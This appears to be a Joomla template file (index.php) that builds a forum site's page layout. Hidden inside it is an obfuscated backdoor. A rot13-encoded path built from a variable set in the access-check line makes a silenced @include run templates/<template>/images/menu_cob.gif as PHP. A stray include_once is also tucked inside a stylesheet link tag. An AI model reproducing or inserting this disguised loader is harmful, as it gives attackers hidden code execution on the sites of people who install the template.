<?php
// no direct access
defined( '_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die( 'Restricted access' );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />
<!--[if lte IE 6]>
<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/ieonly.css" <?php include_once('html/pagination.php');?> rel="stylesheet" type="text/css" />
<![endif]-->
</head>
<body id="page_bg">
<a name="up" id="up"></a>

<div id="main_bg">
	<img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('colorVariation'); ?>/top.png" alt="top" /><div id="logo_bg">
    	<img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('colorVariation'); ?>/logo.png" alt="logo" align="left" hspace="15" />
        <a href="index.php" class="logo"><?php echo $mainframe->getCfg('sitename') ;?></a>
        <div id="user4"><jdoc:include type="modules" name="user4" /></div>
        <br clear="all" />
    </div>
    <div id="user3"><div id="pillmenu"><jdoc:include type="modules" name="user3" /></div></div>
    <div id="banner"><jdoc:include type="modules" name="top" /></div>
    <div id="leftcolumn">
    <?php if($this->countModules('left')) : ?>
        <jdoc:include type="modules" name="left" style="rounded" />
    <?php endif; ?>
    <br />
    <div align="center"><jdoc:include type="modules" name="syndicate" /></div>
    </div>
    <div id="maincolumn">
    	<div class="path"><jdoc:include type="modules" name="breadcrumb" /></div><jdoc:include type="message" />
    	<div class="nopad"><jdoc:include type="component" /></div>
    </div>
    <br clear="all" />
    <img id="main_bottom" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('colorVariation'); ?>/bottom.png" alt="bottom" align="bottom" /></div>

<?php if($this->countModules('user1') or $this->countModules('user2')) : ?>
<div id="f_area"><img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('colorVariation'); ?>/top_f_area.png" alt="top" align="top" />
	<?php if($this->countModules('user1')) : ?>
    	<jdoc:include type="modules" name="user1" style="xhtml" />
    <?php endif; ?>
    <?php if($this->countModules('user2')) : ?>
    	<jdoc:include type="modules" name="user2" style="xhtml" />
    <?php endif; ?>
    <br clear="all" />
    <img id="f_area_bottom" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/<?php echo $this->params->get('colorVariation'); ?>/bottom_f_area.png" alt="bottom" align="bottom" /></div>
<?php endif; ?>

    <?php if((!$this->countModules('right') and JRequest::getCmd('layout') == 'form') or !@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) : ?>
    <jdoc:include type="modules" name="layout" style="rounded" />
    <?php endif; ?>	
<p id="power_by" align="center">
	<?php echo JText_('Copyright') ?> <a href="http://www.charteredhaforum.com">Chartered's Forum (2009)!</a>.
	<?php echo JText_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
</p>
<jdoc:include type="modules" name="debug" />

</body>
</html>